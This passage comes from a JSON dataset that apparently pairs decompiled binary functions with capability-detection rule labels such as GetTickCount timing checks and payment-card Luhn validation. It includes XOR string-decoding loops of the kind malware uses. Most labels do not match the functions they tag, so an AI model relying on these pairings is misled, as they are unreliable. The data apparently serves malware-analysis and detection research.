        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005f871\n\nvoid __cdecl fcn.0005f7e0(int32_t arg_8h)\n\n{\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (0x50 < *(*(arg_8h + 0x98) + 4) - 1U) {\n        *(arg_8h + 0xe0) = 0;\n        *(arg_8h + 0xc0) = 0;\n        *(arg_8h + 0xa0) = 0;\n        return;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 207
    },
    "000611e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0006120b\n\nuint __cdecl fcn.000611e0(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    if (0xb3 < arg_8h - 0xc) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 98
    },
    "0006a9c0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.0006a9c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_8h;\n    do {\n        iVar1 = fcn.000345a0(var_8h + 0x50, 30000);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.00034a10(var_8h + 0x44);\n        if (*(var_8h + 0x154) != *(var_8h + 0x158)) {\n            var_4h = *(var_8h + 0x154) + -1;\n            if (var_4h < 0) {\n                var_4h = 0x1f;\n            }\n            while (*(var_8h + 0x158) != var_4h) {\n                uVar2 = *(var_8h + 0x158) & 0x8000001f;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xffffffe0) + 1;\n                }\n                *(var_8h + 0x158) = uVar2;\n                iVar1 = fcn.00026ff0();\n                if (iVar1 - *(var_8h + 0x58 + *(var_8h + 0x158) * 8) < 300000) break;\n                fcn.000761d0(var_8h + 0x54 + *(var_8h + 0x158) * 8, 0);\n                *(var_8h + 0x54 + *(var_8h + 0x158) * 8) = 0;\n                *(var_8h + 0x58 + *(var_8h + 0x158) * 8) = 0xffffffff;\n                uVar2 = *(var_8h + 0x158) + 1U & 0x8000001f;\n                if (uVar2 < 0) {\n                    uVar2 = (uVar2 - 1 | 0xffffffe0) + 1;\n                }\n                *(var_8h + 0x158) = uVar2;\n            }\n        }\n        var_8h = var_8h + 0x44;\n        fcn.00034a80(var_8h);\n    } while( true );\n}\n",
        "token_count": 589
    },
    "00018210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00018210(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t var_4h;\n    \n    for (var_4h = 0; var_4h < 0xe; var_4h = var_4h + 1) {\n        if ((arg_8h & *(var_4h * 8 + -0x7ff33888)) == 0) {\n            *(arg_ch + var_4h * 2) = 0x2d;\n        }\n        else {\n            *(arg_ch + var_4h * 2) = *(var_4h * 8 + -0x7ff33884);\n        }\n    }\n    *(arg_ch + var_4h * 2) = 0;\n    return arg_ch;\n}\n",
        "token_count": 184
    },
    "00019310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00019310(void)\n\n{\n    if (*0x800cdc54 != '\\0') {\n        *0x800cdc54 = '\\0';\n        fcn.00037760(0x800cccb8, 0);\n        fcn.00037710(0x800cccb8);\n        fcn.0001a670();\n        fcn.00034a10(0x800cdc58);\n        fcn.00034a80(0x800cdc58);\n        fcn.000376a0(0x800cdc5c);\n        fcn.000349e0(0x800cdc58);\n        fcn.000357f0(*0x800ce37c);\n        fcn.00078bfa(0x800cdc58, 0, 0x728);\n    }\n    return;\n}\n",
        "token_count": 183
    },
    "00019ca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.00019ca0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        if (*0x800cdc54 == '\\0') {\n            return 0;\n        }\n        iVar1 = fcn.00019d20(&var_4h, &var_8h);\n        if (iVar1 != 0) {\n            fcn.0001a670();\n            fcn.00019fa0(var_4h, var_8h);\n        }\n        if (*0x800cdc54 == '\\0') break;\n        fcn.00043cb0(1000);\n    }\n    return 0;\n}\n",
        "token_count": 175
    },
    "0001a950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001a950(uint arg_8h)\n\n{\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 35
    },
    "0001d360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001d360(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_110h;\n    uint var_108h;\n    \n    iVar1 = fcn.00036d60(arg_ch, &var_108h, 0x104);\n    if (((iVar1 != 0) && (arg_10h != '\\0')) && (iVar1 = fcn.00078a92(&var_108h, 0x800517ac),  iVar1 == 0)) {\n        fcn.0001ace0(&var_110h, 0x80055a50, 1);\n        fcn.00037710(&var_110h);\n        fcn.0001ace0(&var_110h, 0x8005d340, 0);\n        fcn.00037710(&var_110h);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "0001ee10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0001ee10(uint param_1)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cdc57 != '\\0') {\n        *0x800cdc57 = '\\0';\n        fcn.00063fd0(*0x800ce61c, param_1);\n        fcn.00063b20(0x800ce61c);\n        fcn.00063fd0(*0x800ce624);\n        fcn.00063b20(0x800ce624);\n        fcn.00063fd0(*0x800ce618);\n        fcn.00063b20(0x800ce618);\n        fcn.00063fd0(*0x800ce628);\n        fcn.00063b20(0x800ce628);\n        fcn.00063fd0(*0x800ce614);\n        fcn.00063b20(0x800ce614);\n        fcn.00063fd0(*0x800ce620);\n        fcn.00063b20(0x800ce620);\n        fcn.0001bca0();\n        fcn.000376a0(0x800ce65c);\n        for (var_4h = 0; var_4h < *0x800ce608; var_4h = var_4h + 1) {\n            fcn.000357f0(*(*0x800ce60c + var_4h * 4));\n        }\n        fcn.000357f0(*0x800ce60c);\n    }\n    return;\n}\n",
        "token_count": 365
    },
    "00021580": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00021580(uint arg_8h)\n\n{\n    fcn.000357f0(arg_8h);\n    return;\n}\n",
        "token_count": 34
    },
    "000232e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000232e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t var_4h;\n    \n    uVar1 = *(arg_8h + 0x1c) + arg_ch;\n    if (uVar1 < *(arg_8h + 0xc) || uVar1 == *(arg_8h + 0xc)) {\n        var_4h = *(arg_8h + 0xc);\n    }\n    else {\n        var_4h = (((uVar1 - *(arg_8h + 0xc)) + -1 + *(arg_8h + 0x14)) / *(arg_8h + 0x14)) * *(arg_8h + 0x14) +\n                 *(arg_8h + 0xc);\n    }\n    return var_4h;\n}\n",
        "token_count": 203
    },
    "00023e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00023e30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    *(arg_8h + 0x2c) = *(arg_8h + 0x2c) + arg_ch;\n    (**(*(arg_8h + 0x44) + 0x18))(*(arg_8h + 0x48), arg_8h + 8, 0x2c, 0);\n    return;\n}\n",
        "token_count": 107
    },
    "00024d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00024d60(uint noname_0, uint arg_ch, int32_t arg_10h)\n\n{\n    fcn.00029dc0(arg_10h + 100, 0, arg_ch, 0, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "000255d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000255d0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00035950(*arg_8h);\n    *arg_8h = uVar1;\n    uVar1 = fcn.00035950(arg_8h[1]);\n    arg_8h[1] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[2]);\n    arg_8h[2] = uVar1;\n    uVar1 = fcn.00035950(*(arg_8h + 0xd));\n    *(arg_8h + 0xd) = uVar1;\n    uVar1 = fcn.00035950(*(arg_8h + 0x11));\n    *(arg_8h + 0x11) = uVar1;\n    uVar1 = fcn.00035950(*(arg_8h + 0x15));\n    *(arg_8h + 0x15) = uVar1;\n    uVar1 = fcn.00035950(*(arg_8h + 0x19));\n    *(arg_8h + 0x19) = uVar1;\n    uVar1 = fcn.00035950(*(arg_8h + 0x1d));\n    *(arg_8h + 0x1d) = uVar1;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        uVar1 = fcn.00035950(*(arg_8h + var_4h * 4 + 0x21));\n        *(arg_8h + var_4h * 4 + 0x21) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "000256a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000256a0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_4h;\n    \n    uVar1 = fcn.00035950(*arg_8h);\n    *arg_8h = uVar1;\n    uVar1 = fcn.00035950(arg_8h[1]);\n    arg_8h[1] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[2]);\n    arg_8h[2] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[3]);\n    arg_8h[3] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[8]);\n    arg_8h[8] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[9]);\n    arg_8h[9] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[10]);\n    arg_8h[10] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[0xb]);\n    arg_8h[0xb] = uVar1;\n    uVar1 = fcn.00035950(arg_8h[0xc]);\n    arg_8h[0xc] = uVar1;\n    for (var_4h = 0; var_4h < 4; var_4h = var_4h + 1) {\n        uVar1 = fcn.00035950(arg_8h[var_4h + 4]);\n        arg_8h[var_4h + 4] = uVar1;\n    }\n    return;\n}\n",
        "token_count": 395
    },
    "00026f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00026f30(uint noname_0, uint arg_ch)\n\n{\n    fcn.000356c0(arg_ch);\n    return;\n}\n",
        "token_count": 37
    },
    "00026f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00026f50(uint noname_0, uint arg_ch)\n\n{\n    fcn.000357f0(arg_ch);\n    return;\n}\n",
        "token_count": 37
    },
    "000277f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.000277f0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    while( true ) {\n        if (0x1b < var_4h) {\n            return 0x21590001;\n        }\n        if (*(var_4h * 8 + -0x7ff33ab8) == arg_ch) break;\n        var_4h = var_4h + 1;\n    }\n    uVar1 = (**(var_4h * 8 + -0x7ff33ab4))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return uVar1;\n}\n",
        "token_count": 223
    },
    "000298c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000298c0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_70h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.000294e0(arg_8h, &var_70h, 100, &var_8h);\n    if (iVar1 == 0) {\n        arg_ch = fcn.00036370(&var_70h, &var_4h, 0);\n    }\n    return arg_ch;\n}\n",
        "token_count": 125
    },
    "0002a480": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002a480(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00020a80(arg_10h, 0x11, 2, &var_4h, 4);\n    if (iVar1 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        uVar2 = fcn.00028a60(0xfffffffe, 4, var_4h + 1);\n    }\n    return uVar2;\n}\n",
        "token_count": 150
    },
    "0002b6e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002b6e0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0001d840();\n    *(arg_8h + 0x11c) = uVar1;\n    *(arg_8h + 0x118) = 1;\n    uVar1 = fcn.0005d0f0(*(arg_8h + 0x11c), arg_ch, arg_10h, arg_14h, arg_8h + 4);\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "0002b9a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002b9a0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbe17 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbdd8) = *(var_4h + 0x800cbdd8) ^ *(var_4h + 0x800cbd98);\n        }\n    }\n    return 0x800cbdd8;\n}\n",
        "token_count": 132
    },
    "0002ba00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002ba00(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbe97 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbe58) = *(var_4h + 0x800cbe58) ^ *(var_4h + 0x800cbe18);\n        }\n    }\n    return 0x800cbe58;\n}\n",
        "token_count": 131
    },
    "0002ba60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002ba60(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbf17 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbed8) = *(var_4h + 0x800cbed8) ^ *(var_4h + 0x800cbe98);\n        }\n    }\n    return 0x800cbed8;\n}\n",
        "token_count": 131
    },
    "0002bac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bac0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbf97 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbf58) = *(var_4h + 0x800cbf58) ^ *(var_4h + 0x800cbf18);\n        }\n    }\n    return 0x800cbf58;\n}\n",
        "token_count": 131
    },
    "0002bb20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bb20(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc017 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbfd8) = *(var_4h + 0x800cbfd8) ^ *(var_4h + 0x800cbf98);\n        }\n    }\n    return 0x800cbfd8;\n}\n",
        "token_count": 130
    },
    "0002bb80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bb80(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc097 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc058) = *(var_4h + 0x800cc058) ^ *(var_4h + 0x800cc018);\n        }\n    }\n    return 0x800cc058;\n}\n",
        "token_count": 126
    },
    "0002bbe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bbe0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc117 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc0d8) = *(var_4h + 0x800cc0d8) ^ *(var_4h + 0x800cc098);\n        }\n    }\n    return 0x800cc0d8;\n}\n",
        "token_count": 132
    },
    "0002bc40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bc40(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc197 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc158) = *(var_4h + 0x800cc158) ^ *(var_4h + 0x800cc118);\n        }\n    }\n    return 0x800cc158;\n}\n",
        "token_count": 126
    },
    "0002bca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bca0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc217 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc1d8) = *(var_4h + 0x800cc1d8) ^ *(var_4h + 0x800cc198);\n        }\n    }\n    return 0x800cc1d8;\n}\n",
        "token_count": 133
    },
    "0002bd00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bd00(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc297 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc258) = *(var_4h + 0x800cc258) ^ *(var_4h + 0x800cc218);\n        }\n    }\n    return 0x800cc258;\n}\n",
        "token_count": 126
    },
    "0002bd60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bd60(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc317 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc2d8) = *(var_4h + 0x800cc2d8) ^ *(var_4h + 0x800cc298);\n        }\n    }\n    return 0x800cc2d8;\n}\n",
        "token_count": 132
    },
    "0002bdc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002bdc0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc397 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc358) = *(var_4h + 0x800cc358) ^ *(var_4h + 0x800cc318);\n        }\n    }\n    return 0x800cc358;\n}\n",
        "token_count": 127
    },
    "0002be20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002be20(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cc417 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cc3d8) = *(var_4h + 0x800cc3d8) ^ *(var_4h + 0x800cc398);\n        }\n    }\n    return 0x800cc3d8;\n}\n",
        "token_count": 132
    },
    "0002be80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002be80(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002b9a0();\n    fcn.000789c6(arg_8h, arg_ch, 0x80054634, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 99
    },
    "0002beb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002beb0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba00();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054660, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 94
    },
    "0002bee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bee0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba60();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054660, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 94
    },
    "0002bf10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bf10(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba00();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054628, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 94
    },
    "0002bf40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bf40(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba60();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054628, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 94
    },
    "0002bf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bf70(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002ba00();\n    fcn.000789c6(arg_8h, arg_ch, 0x8005466c, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 98
    },
    "0002bfa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bfa0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bac0();\n    fcn.000789c6(arg_8h, arg_ch, 0x8005467c, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 99
    },
    "0002bfd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002bfd0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bb20();\n    fcn.000789c6(arg_8h, arg_ch, 0x8005467c, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 98
    },
    "0002c000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c000(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bb80();\n    fcn.000789c6(arg_8h, arg_ch, 0x80054634, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002c030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c030(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bbe0(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002c060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c060(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bc40(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002c090": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c090(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bbe0();\n    fcn.000789c6(arg_8h, arg_ch, 0x80051644, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 97
    },
    "0002c0c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c0c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bc40();\n    fcn.000789c6(arg_8h, arg_ch, 0x80051644, uVar1);\n    *(arg_8h + -2 + arg_ch * 2) = 0;\n    return;\n}\n",
        "token_count": 99
    },
    "0002c0f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c0f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bbe0();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054630, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0002c120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c120(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bca0();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054694, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 95
    },
    "0002c150": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c150(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bd00(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002c180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c180(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bd60(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002c1b0": {
        "rules": [
